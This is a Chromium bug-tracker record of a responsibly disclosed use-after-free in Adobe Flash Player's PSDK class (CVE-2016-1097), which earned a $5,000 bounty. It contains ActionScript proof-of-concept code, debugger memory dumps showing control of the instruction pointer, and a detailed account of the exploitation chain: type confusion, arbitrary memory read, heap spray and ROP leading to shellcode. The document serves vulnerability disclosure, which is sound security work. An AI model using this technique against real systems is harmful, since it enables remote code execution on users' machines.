# Security: Adobe Flash Player PSDK Use After Free Vulnerability

| Field | Value |
|-------|-------|
| **Issue ID** | [40083834](https://issues.chromium.org/issues/40083834) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **CVE IDs** | CVE-2016-1097 |
| **Reporter** | we...@gmail.com |
| **Assignee** | na...@google.com |
| **Created** | 2016-03-11 |
| **Bounty** | $5,000.00 |

## Description

I. Summary
Adobe Flash Player is prone to a vulnerability which leads to Use After Free. 
Since the release condition is highly controllable, it is feasible to build a fully working exploit for shellcode execution with proper AS3 object occupied the original PSDK memory. 
------------------------------------------------------------------
II. Description
Adobe Flash is a multimedia and software platform used for authoring of vector graphics, animation, games and rich Internet applications (RIAs) that can be viewed, played and executed in Adobe Flash Player. 

PSDK Class expose a member function "release()", which can be called directly to release the inner memory of PSDK.pSDK.
PSDK.pSDK is a static variable this is allocated and initialized by the AVM.
After releasing the inner memory of PSDK.pSDK, invoking its member function will lead to memory crash because of the unavailability of its virtual function table.

crash.swf is the poc to simply crash the process by calling PSDK's member funciton after releasing its inner memory.
Source Code of crash.swf:
package
{
	import com.adobe.tvsdk.mediacore.PSDK;	
	import flash.display.Sprite;	
	public class crash extends Sprite
	{
		public function crash()
		{
			var ps:PSDK = PSDK.pSDK;			
			ps.release();
			ps.createAuditudeSettings();
		}
	}
}

Also, I am able to occupy the releasing memory of PSDK.pSDK with fully control memory bytes.
control.swf is the simplest way I found to control the PSDK.pSDK memory.
Source Code of control.swf:
package
{
	import com.adobe.tvsdk.mediacore.PSDK;
	import com.adobe.tvsdk.mediacore.metadata.Metadata;
	import flash.utils.ByteArray;
	import flash.display.Sprite;
	
	public class control extends Sprite
	{
		public function control()
		{
			var ps:PSDK = PSDK.pSDK;
			var mt:Metadata = new Metadata();
			var bytes:ByteArray = new ByteArray();
			bytes.length = 0x20;
			bytes.position = 0;
			bytes.writeUnsignedInt(0xCCCCCCCC);
			bytes.writeUnsignedInt(0xCCCCCCCC);
			bytes.writeUnsignedInt(0xCCCCCCCC);
			bytes.writeUnsignedInt(0xCCCCCCCC);
			bytes.writeUnsignedInt(0xCCCCCCCC);
			bytes.writeUnsignedInt(0xCCCCCCCC);
			bytes.writeUnsignedInt(0xCCCCCCCC);
			bytes.writeUnsignedInt(0xCCCCCCCC);
			ps.release();
			mt.setByteArray("jack",bytes);
		}
	}
}

PSDK.pSDK memory before releasing:
==================================
056E7EB8  109ADF4C  Flash32_.109ADF4C
056E7EBC  109ADF38  Flash32_.109ADF38
056E7EC0  076B81F0 
056E7EC4  056E8E88 
056E7EC8  F8EDEA39 
056E7ECC  000060E8 
056E7ED0  0B31C3D0 
056E7ED4  00000000
===================================

PSDK.pSDK memory After releasing:
===================================
056E7EB8  109A0052  Flash32_.109A0052
056E7EBC  109ADC40  Flash32_.109ADC40
056E7EC0  00000000 
056E7EC4  056E8E88 
056E7EC8  F8EDEA39 
056E7ECC  000060E8 
056E7ED0  0B31C3D0 
056E7ED4  00000000 
===================================

After calling setByteArray, the memory of PSDK.pSDK is controlled
===================================
056E7EB8  CCCC0057 
056E7EBC  CCCCCCCC 
056E7EC0  CCCCCCCC 
056E7EC4  CCCCCCCC 
056E7EC8  CCCCCCCC 
056E7ECC  CCCCCCCC 
056E7ED0  CCCCCCCC 
056E7ED4  CCCCCCCC 
===================================

With the help of setByteArray, the PSDK.pSDK is now fulfilled with 0xCC.
At the end of function control(), AMV GC will kick in and try to recycle the memory of ps.
During the recycling process, destructor of PSDK will be called and EIP is controlled.
===================================
0FEC2F0F  MOV EAX,DWORD PTR DS:[ECX]
0FEC2F11  PUSH 0
0FEC2F13  CALL DWORD PTR DS:[EAX+4] <-- EAX=0xCCCCCCCC
0FEC2F16  MOV EAX,DWORD PTR SS:[ESP+8]
0FEC2F1A  MOV DWORD PTR DS:[ESI+10],EAX
0FEC2F1D  TEST EAX,EAX
0FEC2F1F  JE SHORT Flash32_.0FEC2F2A
===================================

Latest version of Adobe Flash Player has been tested under Windows7 + IE11.
------------------------------------------------------------------
III. Impact
Use After Free
------------------------------------------------------------------
IV. Affected
Adobe Flash Player 21.0.0.182
Other versions may also be affected.
------------------------------------------------------------------
V. Credit
Wen Guanxing from Venustech ADLAB is credited for this vulnerability.

## Attachments

- [crash.swf](attachments/crash.swf) (application/octet-stream, 818 B)
- [control.swf](attachments/control.swf) (application/octet-stream, 995 B)
- [exploit.swf](attachments/exploit.swf) (application/octet-stream, 2.4 KB)
- [exploit.as](attachments/exploit.as) (text/plain, 4.9 KB)

## Timeline

### we...@gmail.com (2016-03-11)

I will update this issuse with more detailed analysis and very likely to come up with a fully workable exploit.

### in...@chromium.org (2016-03-11)

Natalie, can you please triage this and file a bug with Adobe.

### wf...@chromium.org (2016-03-11)

[Empty comment from Monorail migration]

[Monorail components: Internals>Plugins>Flash]

### sh...@chromium.org (2016-03-11)

[Empty comment from Monorail migration]

### na...@google.com (2016-03-11)

Thanks for the report! I can't seem to get the sample swf to crash, can you reply with detail on how you're loading it (i.e. what browser, OS and version of flash, whether you're loading it from a local file or remote server. etc.) Also, can you provide the source, with instructions on how to compile it? 

### we...@gmail.com (2016-03-12)

For the crash.swf, simply drag it into Internet Explorer 11 will give you a crash.
This has been tested under both Win10_x64 and Win7_x64 with Flash 21.0.0.182.

The source code from the report can be compiled by Adobe Flash Builder with latest SDK since PSDK feature is newly added by Flash 21.

### na...@google.com (2016-03-12)

Thanks! I can get this to crash in the latest standalone player and Chrome unstable, but not release. I'll report it to Adobe.

If you're still working on an exploit, it would be best for rewards purposes if it works in Chrome versus IE, as this is a Chrome Vulnerability Rewards Program. 

### we...@gmail.com (2016-03-12)

[Comment Deleted]

### we...@gmail.com (2016-03-12)

[Comment Deleted]

### we...@gmail.com (2016-03-12)

I have built a workable exploit under Win7_x64_sp1 with IE11 + Flash 21.0.0.182.
exploit.swf will pop up the calc.exe once being dragged into the browser.
exploit.as is the source code of exploit.swf and should be compiled by Adobe Flash Builder with latest SDK.




As mentioned before, ps.release() will release the inner memory of a static object PSDK.pSDK.
PSDK.pSDK is allocated by malloc with 0x20 to be its size.
After ps.release(), I managed to occupy its inner memory with a Track object with following code snippets:
=====================================
var ps:PSDK = PSDK.pSDK;
ps.release();
var track:Track = new Track("j","lan",true,true);
=====================================

After ps.release(), PSDK inner memory's layout:
=====================================
Address   Value     Comment
07B67E60	526D0034	Flash32_.526D0034
07B67E64	526D99C0	Flash32_.526D99C0
07B67E68	00000000	
07B67E6C	07B68E88	
07B67E70	055766C3	
07B67E74	000099E5	
07B67E78	0963A958	
07B67E7C	00000000
=====================================

Then, Track object occupies the orginal PSDK inner memory:
=====================================
Address	  Value	    Comment
07B67E60	526DD884	Flash32_.vtable_Track
07B67E64	00000001	length = 1
07B67E68	07B68AB0	ASCII “j”
07B67E6C	00000003	length = 1
07B67E70	07B68AC0	ASCII “lan”
07B67E74	00000101	True True
07B67E78	00000000	
07B67E7C	00000000
=====================================

Now Use-After-Free has become a typical Type-Confusion.

So, when ps.createDispatcher() is invoked, it is actually a member function of Track being triggered.
This Type-Confusion function call use this+4 as a counter.
It decrements the counter and release itself once the counter equals 0.
The "counter" is fully controlled by us as it is actually the length of a string object - Track.name.
I have set the "counter" to be 1 so that ps.createDispatcher() will release the memory again.

At this moment, both track and ps are pointing to the inner memory of PSDK.pSDK which is still in free status.

Recall from the poc report, Metadata.setByteArray() is also capable of occuping the PSDK.pSDK memory, such as:
=====================================
var bytes:ByteArray = new ByteArray();
bytes.length = 0x20;
var mt:Metadata = new Metadata();
mt.setByteArray("jack", bytes);
=====================================

By means of Metadata.setByteArray(), both Track and PSDK object's content is under control.
When Track.name is invoked, AVM will return a string object to AS3 level.
The string object is built based on the buffer pointer and its length. 
Since Track.name puts its string buffer pointer at this+8, modifying the pointer gives us the ability to read any piece of the memory.

Here comes the interesting part.
Although setByteArray allocates 0x20 bytes and occupies the inner memory of PSDK/Track, this 0x20 is actually a temporary block which will be freed again after setByteArray().
Metadata is saving its content somewhere else, this temporary 0x20 bytes is born to control the PSDK content~~

From now on, with setByteArray controlling the buffer pointer and Track.name reading the memory value, I'm able to searching the memory for ROP gadgets.

I start by heap-spraying a bunch of Vector.<Object> with "this" pointer fulfilled.
Reading at 0x0ae20020 will 99% hit one of the Vector.<Object> and give us "this".
With "this", I managed to find the base address of Flash module and ByteArray objects storing the shellcode as well as ROP chains.

A fake vtable is built upon one of the ByteArray objects, which is fulfilled with ROP chains setting shellcode memory to be RX.
The shellcode simply pops up the calc.exe and restore the ESP, no crash will there be after shellcode execution.


### na...@google.com (2016-04-11)

Thanks, I've reported this to Adobe, it's tracked as PSIRT-4925.

### sh...@chromium.org (2016-04-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-05-26)

[Empty comment from Monorail migration]

### do...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-26)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-02-13)

[Empty comment from Monorail migration]

### na...@google.com (2017-02-15)

This is CVE-2016-1097

### sh...@chromium.org (2017-02-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-02-18)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-02-18)

Nice one!  The panel decided to award $5,000 for this report. Cheers!

### aw...@chromium.org (2017-02-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-02-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-02-19)

Your change meets the bar and is auto-approved for M57. Please go ahead and merge the CL to branch 2987 manually. Please contact milestone owner if you have questions.
Owners: amineer@(clank), cmasso@(bling), ketakid@(cros), govind@(desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2017-02-20)

No merge needed.

### aw...@google.com (2017-03-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-05-25)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2017-05-25)

This issue was migrated from crbug.com/chromium/594004?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/620949]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083834)*
